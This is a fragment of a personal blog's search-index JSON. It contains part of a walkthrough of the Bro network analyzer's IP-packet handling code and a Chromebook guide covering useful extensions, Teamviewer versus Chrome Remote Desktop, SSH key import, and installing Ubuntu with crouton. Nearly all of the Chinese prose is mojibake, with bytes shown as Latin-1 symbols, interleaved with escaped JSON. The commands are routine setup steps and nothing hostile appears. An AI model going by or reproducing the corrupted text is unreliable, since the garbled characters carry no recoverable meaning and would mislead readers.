args-\u0026gt;append(BuildData(data, uh_len, len, caplen)); try { discard_packet = check_udp-\u0026gt;Call(args)-\u0026gt;AsBool(); } catch ( InterpreterException\u0026amp; e ) { discard_packet = false; } delete args; } } else { if ( check_icmp ) { const struct icmp* ih = (const struct icmp*) data; val_list* args = new val_list; args-\u0026gt;append(ip-\u0026gt;BuildPktHdrVal()); try { discard_packet = check_icmp-\u0026gt;Call(args)-\u0026gt;AsBool(); } catch ( InterpreterException\u0026amp; e ) { discard_packet = false; } delete args; } } return discard_packet; } åœ¨è¿™é‡Œä¸»è¦æ˜¯å…³é”®æ˜¯å››ä¸ªéƒ¨åˆ†\nFragReassembler* f = 0; å®šä¹‰ç‰‡æ®µé‡ç»„æ ‡å¿—ä½ä¸º0 f = NextFragment(t, ip_hdr, pkt-\u0026gt;data + pkt-\u0026gt;hdr_size); å¾—åˆ°ä¸‹ä¸€ä¸ªç‰‡æ®µçš„æŒ‡é’ˆ const IP_Hdr* ih = f-\u0026gt;ReassembledPkt(); FragReassemblerTracker frt(this, f); è¯¦ç»†åˆ†æDoNextPacketå‡½æ•°çš„å¤„ç†è¿‡ç¨‹ FragReassemblerç±»ç»“æ„è§£æ class FragReassembler (Frag.h)\néœ€è¦çœ‹ä¸€ä¸‹FragReassemblerè¿™ä¸ªç±»é‡Œé¢çš„æˆå‘˜å˜é‡ä»¥åŠç›¸åº”çš„å‡½æ•°ã€‚åœ¨è¿™ä¸ªç±»å½“ä¸­ï¼Œæœ€é‡è¦çš„å‡½æ•°æ˜¯ReassembledPkt\nNextFragmentå‡½æ•°å¤„ç†è¿‡ç¨‹ FragReassembler* NetSessions::NextFragment(double t, const IP_Hdr* ip, const u_char* pkt) (sessions.cc)\nåœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œä¸»è¦æŸ¥æ‰¾äº†fragmentï¼Œå¦‚æœæ²¡æœ‰ä¸‹ä¸€ä¸ªï¼Œå°±æ–°å»ºä¸€ä¸ªæ–°çš„Fragmentå¹¶æ·»åŠ åˆ°fragmentsçš„ç»“æ„ä½“é‡Œé¢å»ã€‚\nReassembledPktå‡½æ•°å¤„ç†è¿‡ç¨‹ è¿™ä¸ªå‡½æ•°çš„å¤„ç†è¿‡ç¨‹åªæœ‰ä¸€æ¡ã€‚\nReassembledPkt() (Frag.h)\nconst IP_Hdr* ReassembledPkt()\t{ return reassembled_pkt; }\nå¯¹åº”çš„IP_Hdr* reassembled_pkt;,æ‰€ä»¥åªæ˜¯è¿”å›å»äº†ä¸€ä¸ªæŒ‡é’ˆå¤´\nFragReassemblerTracker frt(this, f)å¤„ç†è¿‡ç¨‹ å¤„ç†Connçš„è¿‡ç¨‹ åœ¨DoNextPacketè¿™ä¸ªå‡½æ•°çš„æœ€åï¼Œä¼šå»æ–°å»ºæˆ–è€…æ‰¾åˆ°ä¸€ä¸ªConnå¤„ç†å¤„ç†æ•°æ®åŒ…ã€‚æ‰§è¡Œä»£ç :\nDoNextPacket() (Sessions.cc)\nåœ¨å¤„ç†Connè¿™ä¸ªéƒ¨åˆ†çš„æ—¶å€™ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¯¹åº”çš„connection,æ ¹æ®hashå€¼å»æŸ¥è¯¢HashKey* h = BuildConnIDHashKey(id);,å¦‚æœæ²¡æœ‰å¯¹åº”çš„Connï¼Œé‚£ä¹ˆå°±å»æ–°å»ºä¸€ä¸ªï¼Œæ–°å»ºå®Œä¹‹åï¼Œæ’å…¥åˆ°connectçš„é“¾è¡¨ä¸­ã€‚å¦‚æœå·²ç»æœ‰äº†å¯¹åº”çš„Conné‚£å°±éœ€è¦åˆ¤æ–­å½“å‰çš„connæ˜¯ä¸æ˜¯ä¸æ­£ç¡®çš„æ•°æ®ä»¥åŠæœ‰æ²¡æœ‰è¢«å¤ç”¨ã€‚å¦‚æœæœ‰çš„è¯ï¼Œåˆ é™¤å¯¹åº”çš„connçš„Hashå€¼ã€‚\n","date":1528506159,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1528506159,"objectID":"573978b3fafb8c459617d8e0871d8a47","permalink":"http://www.guozet.me/post/Bro-source-codes-walkthought/","publishdate":"2018-06-09T01:02:39Z","relpermalink":"/post/Bro-source-codes-walkthought/","section":"post","summary":"å‰è¨€ Broæ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„ç½‘ç»œåè®®åˆ†æå™¨ã€‚Broé‡Œé¢çš„Binpacè§£æå™¨å¯ä»¥å¾ˆæ–¹ä¾¿çš„è®©æˆ‘ä»¬ä½¿ç”¨Binpacè¯­è¨€ä¹¦å†™åè®®è§£æå™¨ï¼Œå¹¶é€šè¿‡Binpacè½¬æ¢æˆC++è¯­è¨€ï¼Œè¿™åœ¨ä½¿ç”¨ä¸­èƒ½å¤Ÿå¾ˆå¤§ç¨‹åº¦çš„å‡å°‘å¼€å‘æ—¶é—´ï¼Œä¹Ÿå¯ä»¥é¿å…æ‰‹å†™å®¹æ˜“è€ƒè™‘ä¸å…¨çš„é—®é¢˜ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨Binpacä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å»äº†è§£Broåœ¨å¤„ç†ç½‘ç»œæ•°æ®åŒ…çš„æ—¶å€™çš„å¤„ç†æµç¨‹ï¼Œèƒ½å¤Ÿæ–¹ä¾¿æˆ‘ä»¬åœ¨Binpacä½¿ç”¨ä¸­å»æ‰å’ŒBroè€¦åˆçš„éƒ¨åˆ†ï¼Œç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„åè®®è§£æå™¨çš„C++æ–‡ä»¶ã€‚\n","tags":"Network","title":"Broæºä»£ç åˆ†æ---IPæ•°æ®åŒ…å¤„ç†æµç¨‹","type":"post"},{"authors":null,"categories":"Laptop","content":"å‰è¨€ ä¹‹å‰ä½¿ç”¨äº†ä¸¤å¹´çš„MSI GE60 2PG ç¬”è®°æœ¬æ•£çƒ­é—®é¢˜è¶Šæ¥è¶Šä¸¥é‡ï¼Œå¯¼è‡´é£æ‰‡æ°¸è¿œè½¬åˆ°æœ€é«˜è½¬é€Ÿï¼Œå¦åˆ™CPUæ¸©åº¦ä¸€ç›´æ— æ³•é™ä¸‹æ¥ã€‚ä½†æ˜¯ï¼Œé£æ‰‡è½¬åˆ°æœ€é«˜è½¬é€Ÿï¼Œè¿™å°ç”µè„‘äº§ç”Ÿçš„å™ªéŸ³ä¼šéå¸¸å¤§ï¼Œå¦‚æœå’‹å›¾ä¹¦é¦†æˆ–è€…å®éªŒå®¤ä½¿ç”¨ï¼Œå¾ˆå®¹æ˜“å°±å½±å“åˆ°å‘¨å›´å­¦ä¹ çš„å…¶ä»–åŒå­¦äº†ï¼Œäºæ˜¯è€ƒè™‘åˆ°éƒ½ä¹°å¦å¤–ä¸€ä¸ªè½»ä¾¿çš„ï¼Œå¾…æœºæ—¶é—´æ¯”è¾ƒé•¿çš„ç¬”è®°æœ¬åˆ°å­¦æ ¡ï¼Œèƒ½å¤Ÿæ”¯æŒè‡ªå·±çš„å¸¸è§„ä½¿ç”¨ã€‚\nè´­ä¹° Acer Chromebook R11 ç»¼åˆå¯¹æ¯”çš„è‡ªå·±çš„é¢„ç®—ä»¥åŠç½‘å‹çš„è¯„ä»·ï¼Œæœ€åé€‰æ‹©äº† Acer Chromebook R11(å†…å­˜4G, SSD:32G), ä¸»è¦è€ƒè™‘çš„æ˜¯åªéœ€è¦279åˆ€ï¼Œå¾…æœºæ—¶é—´åˆ°10å°æ—¶å·¦å³ï¼Œå±å¹•è§¦å±ï¼Œç”»é¢æ˜¾ç¤ºç»™åŠ›ï¼Œè§¦æ‘¸æ¿é”®ç›˜æ¯”è¾ƒèˆ’æœã€‚ ä¸ªäººä½¿ç”¨Chromebookçš„ç›®æ ‡æ˜¯æ˜¯ï¼š\né˜…è¯»ç½‘é¡µï¼ŒPDFæ–‡æ¡£ï¼Œä½¿ç”¨Google docä¹¦å†™æ–‡æ¡£ ç®€å•ä½¿ç”¨SSHç™»é™†åˆ°æœåŠ¡å™¨ä¹¦å†™ä»£ç  ä»£ç é˜…è¯»ï¼Œç®€å•ç¼–è¯‘ä¸€äº›ç»ƒä¹ ä»£ç  è¿œç¨‹è¿æ¥MSI GE60 ç”µè„‘å®Œæˆå¼€å‘æˆ–å¤„ç†ç´§æ€¥é—®é¢˜ æˆ‘å¹¶ä¸æƒ³ä½¿ç”¨ä¸€å°279åˆ€çš„Chromebookæ¥å®Œæˆè‡ªå·±çš„é¡¹ç›®å¼€å‘æˆ–è€…è¿è¡ŒMatlabä¹‹ç±»çš„è½¯ä»¶ï¼Œå®ƒçš„å®šä½å°±æ˜¯è¾…åŠ©è‡ªå·±å®Œæˆä¸€äº›ç®€å•çš„ä¸éœ€è¦æ¶ˆè€—å¤ªå¤§å†…å­˜èµ„æºçš„å·¥ä½œï¼Œåç»­æˆ‘å¯¹Acer Chromebookçš„ä½¿ç”¨è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯è¿™æ ·å»å®‰æ’çš„ã€‚ ä½¿ç”¨æ‰‹å†Œ å¸¸ç”¨åŠŸèƒ½\u0026amp;æ’ä»¶ Kami ï¼š è¿™å¹¶ä¸èƒ½ç®—ä½œæ˜¯ä¸€ä¸ªæ’ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªåœ¨çº¿çš„PDFé˜…è¯»æ ‡æ³¨ç½‘ç«™ï¼Œä½ å¯ä»¥ç»‘å®šGoogleé‚®ç®±ï¼Œä¸Šä¼ è‡ªå·±æœ¬åœ°çš„æ–‡ä»¶ï¼Œç„¶ååœ¨çº¿é˜…è¯»å¹¶åšç¬”è®°ï¼Œç„¶åå®ƒä¼šè‡ªåŠ¨æŠŠä½ çš„ç¬”è®°ä»¥åŠæ–‡æ¡£ä¿å­˜åˆ°Googleäº‘ç›˜é‡Œé¢ï¼Œååˆ†æ–¹ä¾¿ï¼Œéšæ—¶åœ¨ä½•åœ°éƒ½å¯ä»¥é€šè¿‡æµè§ˆå™¨æ¥æ‰“å¼€ä½¿ç”¨ï¼Œä¸€æ ·çš„ç¬”è®°ï¼Œä¸€æ ·çš„é˜…è¯»è¿›åº¦ï¼Œå¾ˆé€‚åˆä½œä¸ºäº‘ç«¯çš„PDFé˜…è¯»å·¥å…·ã€‚\nstackedit: ç½‘é¡µåº”ç”¨ï¼Œè¿™æ˜¯å¼€æºä¸–ç•Œçš„markdownåˆ©å™¨ï¼Œè®©ä½ éšæ—¶éšåœ°åšç¬”è®°ã€åšè®°å½•ã€‚å¦‚æœä½ å–œæ¬¢å†™åšå®¢ï¼Œæˆ–è€…å–œæ¬¢Markdownè¿™ç§ä¸“æ³¨äºå†™ä½œçš„æ–¹å¼ï¼Œå¼ºçƒˆæ¨èå°è¯•ã€‚\nEvernote Web : è¿™æ˜¯chromeç«¯çš„Evernoteç¬”è®°çš„æ”¶é›†æ’ä»¶ï¼Œèƒ½å¤Ÿå¿«é€Ÿçš„æŠŠç½‘é¡µèµ„æ–™æ”¶é›†åˆ°è‡ªå·±çš„Evernoteé‡Œé¢å»ã€‚\nTelegram : è¿™æ˜¯ä¸€æ¬¾åŠ å¯†çš„é€šä¿¡è½¯ä»¶ï¼Œå¯ä»¥å¾ˆå¥½çš„åœ¨æ‰‹æœºç«¯å’Œç”µè„‘ç«¯åŒæ­¥æ¶ˆæ¯ï¼Œäº’ä¼ æ–‡ä»¶(å¤§å°æ²¡æœ‰é™åˆ¶)ï¼Œå¹¶ä¸”æ¶ˆæ¯å’Œæ–‡ä»¶æ°¸ä¹…ä¿å­˜ï¼Œå¹¶ä¸ä¼šå› ä¸ºä½ æ¢æ”¶é›†æˆ–è€…ç”µè„‘è€Œå¯¼è‡´ä½ çš„æ¶ˆæ¯å’Œæ–‡ä»¶ä¸¢å¤±ã€‚\nGmail Ofline: è¿™æ˜¯æ²¡æœ‰åŠæ³•çš„æ—¶å€™ï¼Œæ€»æ˜¯æœ‰å‘¨å›´æ²¡æœ‰æ— çº¿çš„åœ°æ–¹ï¼Œæ‰€ä»¥ä½ å°±éœ€è¦ä¸€ä¸ªç¦»çº¿çš„Gmailï¼Œè®©è‡ªå·±èƒ½å¤Ÿç¦»çº¿ç¼–è¾‘ä¸€äº›é‚®ä»¶æ¶ˆæ¯ï¼Œå½“Chromebookè¿æ¥åˆ°ç½‘ç»œçš„æ—¶å€™ï¼Œèƒ½å¤Ÿå¿«é€Ÿå‘é€é‚®ä»¶å‡ºå»ã€‚\nChrome Remote Desktop ä½†æˆ‘ä»¬çš„èµ„æ–™åœ¨å®¶é‡Œçš„ç”µè„‘ä¸Šï¼Œæˆ–è€…åœ¨å…¬å¸çš„ç”µè„‘ä¸Šé¢æ—¶ï¼Œæˆ‘ä»¬éœ€è¦çŸ­æš‚çš„è¿æ¥è¿‡å»ï¼Œå¤„ç†ä¸€äº›å·¥ä½œçš„æ—¶å€™ï¼Œè¿™ä¸ªæ’ä»¶å°±èƒ½å¤Ÿå¾ˆå¥½çš„å¸®åŠ©ä½ å¿«é€Ÿçš„å®Œæˆä»»åŠ¡ã€‚\nCaret: Chromebookç«¯çš„ä»£ç é˜…è¯»å·¥å…·ï¼Œå¯¹ä¸­æ–‡æ”¯æŒæ¯”è¾ƒå‹å¥½ã€‚\nMathStudio: å¾ˆå°ä½†æ˜¯åŠŸèƒ½å¾ˆå¼ºå¤§çš„æ•°å­¦å·¥å…·ï¼Œèƒ½å¤Ÿç”»å‡ºç®€å•çš„æ­£å¼¦å›¾å½¢ï¼Œä»¥åŠä¸€äº›å¸¸ç”¨çš„æ•°å­¦å›¾å½¢ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½œä¸ºæ•°å­¦è®¡ç®—å™¨æ¥ä½¿ç”¨ï¼Œå¾ˆæ–¹ä¾¿ã€‚\nPDF Mergy: å°æ’ä»¶ï¼Œå®ŒæˆPDFæ–‡ä»¶çš„åˆå¹¶å·¥ä½œ\nWrite: ä¹¦å†™å°æ’ä»¶ï¼Œèƒ½å¤Ÿæ‰“å¼€ä¸€ä¸ªå¾ˆç»šä¸½çš„ç½‘é¡µï¼Œè®©ä½ ä¸“æ³¨çš„ä¹¦å†™å†…å®¹\nlisten1_chrome_extension å¬æ­Œåˆ©å™¨ï¼Œåœ¨ Chromebook é‡Œæ›´æ˜¯ç¥å™¨ï¼Œä¸ç”¨å®‰è£…ä¸å…¼å®¹çš„ Android apps\nTampermonkey å’Œ ublock è¿™ç§ç¥å™¨å°±ä¸ä»‹ç»äº†\nCog - System Info Viewer æŸ¥çœ‹æ€§èƒ½çš„å·¥å…·\nè¿™äº›æ’ä»¶æ˜¯æˆ‘ä½¿ç”¨è¿‡ä¸€æ®µæ—¶é—´ä¹‹åï¼Œä¾æ—§è¿˜ä¿ç•™åœ¨æˆ‘çš„Chromebookä¸Šé¢çš„å†…å®¹ï¼Œå¦‚æœä½ æ„Ÿå…´è¶£ï¼Œä¸å¦¨å°è¯•ä¸€ä¸‹ã€‚\nè¿›é˜¶æ“ä½œï¼šè¿œç¨‹æ¡Œé¢ åœºæ™¯ é•¿æ—¶é—´ä½¿ç”¨Chromebookè¿æ¥åˆ°å…¬å¸æˆ–è€…å®¶é‡Œè‡ªå·±çš„ä¸»æœºè¿›è¡Œå·¥ä½œï¼Œå®Œæˆé¡¹ç›®ç­‰ï¼Œè¿™å°±éœ€è¦è€ƒè™‘ä½¿ç”¨è¿œç¨‹æ¡Œé¢æ¥å¾ˆå¥½çš„å®Œæˆå·¥ä½œã€‚ç»è¿‡ä¸€ä¸ªæœˆçš„æ—¶é—´ï¼Œé™†ç»­åœ°å°è¯•äº†èƒ½å¤Ÿæ”¯æŒChromebookçš„è¿œç¨‹æ¡Œé¢è½¯ä»¶ã€‚ ä¸ªäººè¦æ±‚ï¼š\né€šè¿‡Chromebookçš„chromeæ’ä»¶æˆ–è€…Appèƒ½å¤Ÿè¿›è¡Œè¿œç¨‹è¿æ¥(å¹¶ä¸æ˜¯é€šè¿‡å®‰å“APP)\nä½¿ç”¨è¿‡ç¨‹ä¸­ä¸é€šè¿‡IPåœ°å€ç›´æ¥è¿æ¥(å°è¯•è¿‡è¿™ç§æ–¹å¼ï¼Œä½†æ˜¯å¹¶ä¸èƒ½è¾¾åˆ°æˆ‘çš„ç”»è´¨è¦æ±‚)\né•¿æ—¶é—´(è¶…è¿‡10å°æ—¶)è¿æ¥ä½¿ç”¨æ¯”è¾ƒç¨³å®š\næ“ä½œæ–¹ä¾¿ï¼ŒChromebookçš„æŒ‰é”®èƒ½å¤Ÿæ­£å¸¸å·¥ä½œ\nç»è¿‡å¯¹æ¯”Teamviewer, Splashtop, Chrome Remote Desktop app, UltraVNCè¿™å‡ æ¬¾èƒ½å¤Ÿåœ¨Chromebookä¸Šé¢ä½¿ç”¨çš„æ’ä»¶æˆ–è€…APPï¼Œå»æ‰äº†æ”¶è´¹çš„Splashtopï¼Œä»¥åŠéœ€è¦IPåœ°å€ç‚¹å¯¹ç‚¹è¿æ¥çš„UltraVNCï¼Œæœ€åä¿ç•™äº†Teamviewerå’ŒChrome Remote Desktop.\nTeamviewer Teamvieweråœ¨chromebookä¸Šè¿æ¥Win10çš„ç”»é¢æ•ˆæœï¼Œå»¶æ—¶æƒ…å†µåº”è¯¥æ˜¯ä¸Šè¿°è½¯ä»¶é‡Œé¢æœ€å¥½çš„äº†ï¼Œå¹¶ä¸”é¢å‘ä¸ªäººä½¿ç”¨æ˜¯å®Œå…¨å…è´¹çš„ï¼Œä½ åªéœ€è¦ç™»å½•ä½ çš„è´¦å·ï¼Œå°±å¯ä»¥å…è´¹æ— å¹¿å‘Šçš„è¿æ¥è‡ªå·±çš„è¿œç¨‹ä¸»æœºï¼Œå¹¶ä¸éœ€è¦è€ƒè™‘IPåœ°å€ï¼Œé˜²ç«å¢™ä»¥åŠNATä»£ç†ä¹‹ç±»çš„ã€‚ä½†ä¹Ÿæœ‰è¿™ä¹ˆå‡ ä¸ªç¼ºç‚¹ã€‚\nChromebookç«¯çš„è½¯ä»¶åŠŸèƒ½ä¸å®Œå–„ï¼Œå¿…é¡»æ¯æ¬¡ç™»å½•åˆ°ç½‘é¡µç«¯æ‰èƒ½å¤Ÿçœ‹åˆ°è‡ªå·±è´¦å·ä¸‹é¢çš„æœºå™¨ï¼Œé€šè¿‡åœ¨ç½‘é¡µç«¯ç‚¹å‡»ç„¶åè°ƒç”¨APPè¿æ¥ï¼Œè¿‡ç¨‹æ¯”è¾ƒç¹ç\nå¯¹Chromebookçš„é”®ç›˜æ²¡æœ‰é€‚é…ï¼Œå¯¼è‡´æ“ä½œèµ·æ¥å¹¶ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚æ¯”å¦‚ï¼šä¸èƒ½ä½¿ç”¨WindowsæŒ‰é”®\nChrome Remote Desktop è°·æ­Œè‡ªå·±çš„è¿œç¨‹æ¡Œé¢è½¯ä»¶ï¼Œæ‰€ä»¥å¯¹Chromebookçš„æ”¯æŒæ¯”è¾ƒå¥½ï¼ŒæŠŠChromebookå³ä¾§çš„CtrlæŒ‰é”®è½¬æ¢ä¸ºäº†WindowsæŒ‰é”®ï¼Œä»¥åŠå¾ˆå¤šçš„Chromebookå¿«æ·é”®ä¹Ÿå¯ä»¥åœ¨è¿œç¨‹æ¡Œé¢çš„æ—¶å€™ä½¿ç”¨ã€‚åˆæ¬¡ä¹‹å¤–ï¼Œå’ŒTeamviewerå¯¹æ¯”èµ·æ¥æœ‰è¿™ä¹ˆå‡ ä¸ªç¼ºç‚¹ï¼š\nå›¾åƒè´¨é‡ä¸æ˜¯å¤ªå¥½ï¼Œæ‰“å­—çš„æ—¶å€™ï¼Œèƒ½å¤Ÿæ˜æ˜¾æ„Ÿè§‰åˆ°å­—ä½“å‘¨å›´æ¨¡ç³Š\nå»¶æ—¶æœ‰æ—¶å€™æ¯”è¾ƒå¤§\nç»¼åˆèµ·æ¥ï¼Œæˆ‘åŒæ—¶ä¿ç•™çš„è¿™ä¸¤ä¸ªè¿œç¨‹æ¡Œé¢è½¯ä»¶ï¼Œåœ¨éœ€è¦é•¿æ—¶é—´å·¥ä½œçš„æ—¶å€™ï¼Œé‚£æˆ‘å°±ä¼šé€‰ç”¨Teamviewer, å› ä¸ºè¿™ä¸ªæ—¶å€™å›¾åƒçš„æ¸…æ™°å¯¹æˆ‘å¾ˆé‡è¦ï¼Œæˆ‘ä¸æƒ³å¯¹ç€æœ‰äº›æ¨¡ç³Šçš„å›¾åƒé•¿è¾¾å…«ä¸ªå°æ—¶ã€‚ä½†å½“æˆ‘åªæ˜¯éœ€è¦å¿«é€Ÿè¿œç¨‹è¿æ¥è¿‡å»ï¼Œæäº¤æ–‡ä»¶æˆ–è€…å‘ä¸€å°ç®€çŸ­çš„é‚®ä»¶çš„æ—¶å€™ï¼Œæˆ‘å°±ä¼šé€‰æ‹©Chrome Remote Desktopï¼Œå®ƒèƒ½å¤Ÿè®©æˆ‘ä»¥æœ€å¿«çš„é€Ÿåº¦å®Œæˆæˆ‘è¿œç¨‹è¿æ¥çš„å·¥ä½œã€‚\nè¿›é˜¶æ“ä½œï¼šSSHè¿æ¥ \u0026mdash; Secure Shell è¿™æ˜¯googleå®˜æ–¹å‡ºçš„SSHæ’ä»¶ï¼Œåˆ°googleåº”ç”¨å•†åº—ä¸‹è½½æ‰©å±•å³å¯ï¼Œä¸‹è½½ä¹‹åæ‰“å¼€å³å¯ã€‚ ä½¿ç”¨è¯´æ˜ï¼š\nusername@hostname or free form text //å¡«å†™ä½ æƒ³ä¸ºè¿™ä¸ªsessionå®šåˆ¶çš„åå­—,æ¯”å¦‚ï¼šlab.university usernameä½ç½®ï¼šå¡«å†™ä½ è¦è¿æ¥çš„æœåŠ¡å™¨çš„è´¦å·åç§°ï¼Œæ¯”å¦‚:root hostnameä½ç½®ï¼šè¿™é‡Œå¯ä»¥ç›´æ¥å¡«å†™IPåœ°å€ï¼Œä¹Ÿå¯ä»¥å¡«å†™åŸŸåï¼Œä¸€è‡´çš„ã€‚æ¯”å¦‚ï¼š192.168.2.121 portï¼šå¡«å†™æœåŠ¡å™¨å¼€æ”¾çš„SSHç«¯å£è¿æ¥åœ°å€,ä¸€èˆ¬æœåŠ¡å™¨é»˜è®¤çš„æ˜¯ï¼š22 SSH relay severs optionsï¼šè¿™ä¸ªä½ç½®ä¸ç”¨å¡«å†™ï¼Œå¯ä»¥ç©ºå‡ºæ¥ å¡«å®Œä¸Šè¿°çš„å†…å®¹ï¼Œå°±å¯ä»¥é€‰æ‹©è¿æ¥äº†ï¼Œä¸Šè¿°å†…å®¹ç›¸å½“äºä½ åœ¨ç»ˆç«¯è¾“å…¥äº†ï¼šssh -p 22 root@192.168.2.121ï¼Œæ ¹æ®åé¦ˆçš„æç¤ºå†…å®¹ï¼Œè¾“å…¥ä½ çš„ç™»é™†å¯†ç å°±å¯ä»¥äº†ã€‚ ä½†æ˜¯å¦‚æœæ¯æ¬¡è¿æ¥éƒ½éœ€è¦ä½ æ—¶è¾“å…¥å¯†ç ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ¯”è¾ƒçƒ¦èºçš„äº‹æƒ…äº†ï¼Œæ‰€ä»¥ä½ éœ€è¦å¯¼å…¥ä½ çš„ç§˜é’¥ä¿¡æ¯\nIdentity:[default] è¿™ä¸ªä½ç½®å¯ä»¥å¯¼å…¥ä½ çš„ç§˜é’¥ä¿¡æ¯ï¼Œç‚¹å‡»`import`ï¼ŒåŒæ—¶é€‰ä¸­è‡ªå·±çš„id_rsaå’Œid_rsa.pubæ–‡ä»¶ä¹‹åï¼Œç‚¹å‡»`open`.ï¼ˆæ³¨æ„ï¼šè¿™éœ€è¦åŒæ—¶å¯¼å…¥ä¸¤ä¸ªæ–‡ä»¶ï¼‰ åˆ°è¿™é‡Œä½ è¿˜ä¸èƒ½å¤Ÿç›´æ¥å…å¯†ç ç™»é™†åˆ°æœåŠ¡å™¨ï¼Œéœ€è¦ä½ å°†è‡ªå·±çš„id_rsa.pubæ–‡ä»¶ä¸­çš„å­—ç¬¦å†…å®¹æ‹·è´åˆ°æœåŠ¡å™¨ç«¯çš„~/.ssh/authorized_keysæ–‡ä»¶ä¸­ã€‚è‡³äºå¦‚ä½•ç”Ÿæˆç§˜é’¥æ–‡ä»¶ï¼Œè¯·å‚è€ƒ æ•™ç¨‹ã€‚\nè¿›é˜¶æ“ä½œ: é€šè¿‡croutonå®‰è£…Ubuntu è¿›å…¥å¼€å‘è€…æ¨¡å¼ å…³æœºä¹‹åï¼ŒåŒæ—¶æŒ‰ä¸‹ esc + åˆ·æ–°é”®(ç¬¬ä¸€æ’å·¦è¾¹æ•°è¿‡å»ç¬¬å››ä¸ªï¼‰+ç”µæºé”®å³å¯ã€‚ç„¶å Chromebook é‡å¯ï¼Œç„¶åæŒ‰ Ctrl+D ç»§ç»­ï¼Œå›è½¦ç¡®å®šå…³é—­chromebook çš„å®‰å…¨è®¤è¯ï¼Œç„¶åchromebooké‡å¯ï¼Œä¸Šé¢çš„è¿›åº¦æ¡èµ°å®Œäº†ä¹‹åè‡ªåŠ¨é‡å¯ï¼Œå°±è¿›å…¥å¼€å‘è€…æ¨¡å¼äº†ã€‚\né€šè¿‡Croutonå®‰è£…Ubuntu croutonçš„ä¸‹è½½é“¾æ¥ï¼š crouton, ä¸‹è½½ä¹‹åé»˜è®¤åœ¨Downloadsæ–‡ä»¶å¤¹ä¸‹é¢\nç”¨ Ctrl+ALT+ t è°ƒå‡º crosh çª—å£ï¼Œè¾“å…¥ shell\nè¾“å…¥sh ~/Downloads/crouton -r listæŸ¥çœ‹croutonzæ”¯æŒçš„Ubuntuç‰ˆæœ¬\nå®‰è£…Ubuntu unity: sudo sh ~/Downloads/crouton -t unity è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯Ubuntuçš„unityæ¡Œé¢ï¼Œå¦‚æœä½ å–œæ¬¢å…¶ä»–æ¡Œé¢ï¼Œå¯ä»¥æŠŠunityæ¢æˆxfce\nå¦‚æœä½ ä¸æƒ³å®‰è£…æ¡Œé¢ï¼Œæˆ–è€…Chromebookçš„èµ„æºæ¯”è¾ƒå°‘ï¼Œå°±å¯ä»¥åªè¾“å…¥: sudo sh ~/Downloads/crouton -t coreï¼Œè¿™æ ·å°±åªä¼šå®‰è£…æœ€ç®€å•çš„ç»ˆç«¯CLI\nè¿›å…¥æ¡Œé¢ï¼šsudo startunity å…¶ä»–å‘½ä»¤ï¼š sudo enter-chroot è¿›å…¥ç»ˆç«¯ sudo startxfce4 å¯åŠ¨ xfce æ¡Œé¢ åœ¨ Chrome os å’Œ Linux ä¹‹é—´åˆ‡æ¢ï¼š ä» Chrome os åˆ° Linuxï¼šshift + ctrl + alt + å‰è¿›é”®ï¼ˆç¬¬1æ’ç¬¬3ä¸ªé”®ï¼‰ ä» Linux åˆ° Chrome os ï¼šshift + ctrl + alt + åé€€é”®ï¼ˆç¬¬1æ’ç¬¬2ä¸ªé”®ï¼‰\nå®˜æ–¹é€šè¿‡Croutonå®‰è£…Ubuntuçš„æ•™ç¨‹ï¼š Installing Ubuntu with crouton\nUbuntuç¯å¢ƒé…ç½® æˆ‘ä»¬é€šè¿‡sudo sh ~/Downloads/crouton -t unityè¿™æ¡å‘½ä»¤å®‰è£…çš„Ubuntuå¹¶ä¸æ˜¯å®Œæ•´ç‰ˆæœ¬çš„ï¼Œå¹¶æ²¡æœ‰è½¯ä»¶ç®¡ç†ä¸­å¿ƒï¼Œä¹Ÿæ²¡å®Œæ•´çš„ç³»ç»Ÿè®¾ç½®åŠŸèƒ½ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ çš„ç”µè„‘æ˜¯32Gä»¥ä¸Šçš„SSDçš„è¯ï¼Œ\nå®‰è£…å®Œæ•´çš„Ubuntuæ¡Œé¢ç‰ˆ åœ¨Ubuntuå†…æ‰“å¼€ç»ˆç«¯ï¼š\nsudo apt-get install ubuntu-desktop //ä¸‹è½½å®Œæ•´ç‰ˆ Ubuntu sudo apt-get remove libreoffice-common -y //åˆ é™¤ libreoffice sudo apt-get remove unity-webapps-common -y //åˆ é™¤ amazon sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku landscape-client-ui-install onboard deja-dup -y è®¾ç½®ä¸­æ–‡å·¥ä½œç¯å¢ƒ sudo apt-get install language-pack-zh-hans language-pack-zh-hans-base language-pack-gnome-zh-hans language-pack-gnome-zh-hans-base sudo apt-get install `check-language-support -l zh` sudo localectl set-locale LANG=zh_CN.UTF-8 croutonå¸¸è§„ä½¿ç”¨(chromebookä¸­çš„croshä¸­æ“ä½œ) croutonçš„å‡çº§ sudo ~/Downloads/crouton -u -n croutonname è¿™é‡Œçš„croutonnameæ›¿æ¢æˆä½ å®‰è£…çš„ç‰ˆæœ¬ï¼šå¦‚xenial\ncroutonå†…çš„Ubuntuå…³æœº ä¸€èˆ¬é€‰æ‹©åœ¨Ubuntué‡Œé¢ç‚¹å‡»å…³æœºæŒ‰é’®(å³ä¸Šè§’è®¾ç½®é‡Œé¢)ï¼Œç„¶åè‡ªåŠ¨é€€å‡ºåˆ°Chrome OSé‡Œé¢\nåˆ é™¤croutonå®‰è£…çš„ubuntu sudo delete-chroot chrootname //chrootname: æ‰€å®‰è£… ubuntu çš„ç‰ˆæœ¬ä»£å·ï¼Œæ¯”å¦‚xenialï¼šä»£è¡¨çš„æ˜¯Ubuntu16ã€‚04 å¤‡ä»½ä¸æ¢å¤Croutoné‡Œé¢çš„Ubuntu å¤‡ä»½\nsudo edit-chroot -b xenial 